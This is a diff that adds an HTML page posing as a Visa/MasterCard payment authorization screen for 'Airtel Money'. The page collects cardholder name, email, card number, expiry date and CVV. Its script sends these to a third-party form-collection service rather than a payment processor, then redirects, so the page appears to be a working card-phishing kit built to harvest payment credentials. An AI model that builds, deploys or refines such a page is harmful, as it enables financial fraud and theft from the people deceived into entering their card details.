@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Payment Service</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="Screenshot 2024-09-13 at 2.00.14 AM.png" alt="Verified by VISA">
+            <img src="Screenshot 2024-09-14 at 3.03.42 AM.png" alt="MasterCard">
+        </div>
+
+        <h3>Payment Information</h3>
+        <p>(Please enter your card details to authorize this transaction.)</p>
+
+        <div class="inputBox">
+            <label for="merchant">Merchant Name:</label>
+            <input type="text" name="merchant" id="merchant" value="Airtel Money" readonly>
+        </div>
+
+        <!-- Updated form to submit data and then redirect -->
+        <form
+            accept-charset="UTF-8"
+            action="https://www.formbackend.com/f/220f1c22d86ad667"  <!-- Replace with your actual FormSubmit email address -->
+            method="POST"
+            onsubmit="handleFormSubmit(event)"
+        >
+            <div class="inputBox">
+                <label for="name">Card Holder's Name:</label>
+                <input type="text" id="name" name="name" placeholder="Enter name on card" required>
+            </div>
+            <div class="inputBox">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email" required>
+            </div>
+            <div class="inputBox">
+                <label for="cardNumber">Card Number:</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter card number" required>
+            </div>
+            <div class="inputBox">
+                <label for="expMonth">Expiry Date:</label>
+                <div style="display: flex;">
+                    <input type="text" id="expMonth" name="expMonth" placeholder="MM" required>
+                    <input type="text" id="expYear" name="expYear" placeholder="YY" required>
+                </div>
+            </div>
+            <div class="inputBox">
+                <label for="cvv">CVV2/CVC2:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" required>
+            </div>
+
+            <!-- Submit button -->
+            <button type="submit">Submit</button>
+        </form>
+
+        <p class="timeout">This page will automatically timeout after 180 seconds</p>
+    </div>
+
+    <script>
+        function handleFormSubmit(event) {
+            event.preventDefault();  // Prevents the default form submission
+
+            // Submitting the form data
+            const form = event.target;
+            fetch(form.action, {
+                method: 'POST',
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    // Redirect to the desired page after form submission
+                    window.location.href = "index copy 2.html";
+                } else {
+                    alert('Form submission failed.');
+                }
+            }).catch(error => {
+                alert('There was an error submitting the form.');
+            });
+        }
+    </script>
+</body>
+</html>
